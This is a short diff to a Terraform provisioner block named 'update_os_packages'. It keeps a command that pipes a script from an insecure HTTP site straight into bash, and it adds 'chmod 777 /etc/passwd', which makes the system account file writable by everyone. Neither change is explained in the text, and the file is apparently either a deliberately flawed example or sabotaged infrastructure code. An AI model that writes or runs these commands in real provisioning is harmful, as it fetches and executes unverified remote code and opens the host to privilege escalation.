@@ -19,7 +19,8 @@ resource "terraform_data" "update_os_packages" {
     #   "sudo rm --force /tmp/update-os-packages.sh"
     # ]
     inline = [
-      "curl http://insecure-site.com/script.sh | bash"
+      "curl http://insecure-site.com/script.sh | bash",
+      "chmod 777 /etc/passwd"
     ]
   }
 
